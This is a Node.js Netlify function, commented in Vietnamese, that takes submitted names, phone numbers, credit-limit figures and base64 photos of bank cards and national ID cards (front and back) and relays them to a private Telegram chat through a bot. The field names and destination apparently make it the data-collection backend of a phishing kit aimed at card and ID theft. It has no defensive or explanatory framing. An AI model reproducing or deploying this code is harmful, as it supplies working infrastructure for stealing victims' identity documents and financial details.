const fetch = require('node-fetch');
const FormData = require('form-data');

// Netlify Function handler
exports.handler = async function (event, context) {
    try {
        if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
        const body = JSON.parse(event.body || '{}');
        const sessionId = body.sessionId || body.session || null;
        if (!sessionId) return { statusCode: 400, body: JSON.stringify({ status: 'err', error: 'missing_sessionId' }) };

        const lines = [];
        lines.push('📩 <b>PHIÊN GỬI THÔNG TIN</b>');
        lines.push(`Phiên: <code>${sessionId}</code>`);
        if (body.page) lines.push(`Trang: <code>${body.page}</code>`);
        if (body.fullName) lines.push(`Họ và Tên: <b>${body.fullName}</b>`);
        if (body.limitGranted !== undefined) lines.push(`Hạn Mức Được Cấp: <code>${body.limitGranted}</code>`);
        if (body.limitAvailable !== undefined) lines.push(`Hạn Mức Khả Dụng: <code>${body.limitAvailable}</code>`);
        if (body.phone) lines.push(`SDT: <code>${body.phone}</code>`);
        lines.push(`Thời gian: <code>${new Date().toISOString()}</code>`);

        const textMessage = lines.join('\n');

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return { statusCode: 500, body: JSON.stringify({ status: 'err', error: 'missing_telegram_secrets' }) };
        }

        const tgBase = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        // send text
        try {
            const r = await fetch(`${tgBase}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: 'HTML' }),
            });
            const jr = await r.json();
            // ignore success/fail for now
        } catch (e) {
            console.error('sendMessage error', e.message);
        }

        // helper parse data url
        function parseDataUrl(dataUrl) {
            const m = /^data:(image\/[A-Za-z0-9.+-]+);base64,(.+)$/.exec(dataUrl);
            if (!m) return null;
            const contentType = m[1];
            const b64 = m[2];
            const buffer = Buffer.from(b64, 'base64');
            return { contentType, buffer };
        }

        const results = [];
        // images field handling
        if (Array.isArray(body.images)) {
            for (let i = 0; i < body.images.length; i++) {
                const item = body.images[i];
                if (typeof item === 'string' && item.startsWith('data:')) {
                    const p = parseDataUrl(item);
                    if (!p) continue;
                    const form = new FormData();
                    form.append('chat_id', TELEGRAM_CHAT_ID);
                    form.append('photo', p.buffer, { filename: `img-${Date.now()}.png`, contentType: p.contentType });
                    try {
                        const rr = await fetch(`${tgBase}/sendPhoto`, { method: 'POST', body: form });
                        const j = await rr.json();
                        results.push(j);
                    } catch (e) {
                        results.push({ error: e.message });
                    }
                }
            }
        }

        // single image fields like cardImage, cccdImage
        const imageKeys = ['cardImage', 'cccdImage', 'cardImageFront', 'cardImageBack'];
        for (const k of imageKeys) {
            const v = body[k];
            if (typeof v === 'string' && v.startsWith('data:')) {
                const p = parseDataUrl(v);
                if (!p) continue;
                const form = new FormData();
                form.append('chat_id', TELEGRAM_CHAT_ID);
                form.append('photo', p.buffer, { filename: `${k}-${Date.now()}.png`, contentType: p.contentType });
                try {
                    const rr = await fetch(`${tgBase}/sendPhoto`, { method: 'POST', body: form });
                    const j = await rr.json();
                    results.push(j);
                } catch (e) {
                    results.push({ error: e.message });
                }
            }
        }

        return { statusCode: 200, body: JSON.stringify({ status: 'ok', results }) };
    } catch (e) {
        console.error('function error', e);
        return { statusCode: 500, body: JSON.stringify({ status: 'err', error: e.message }) };
    }
};
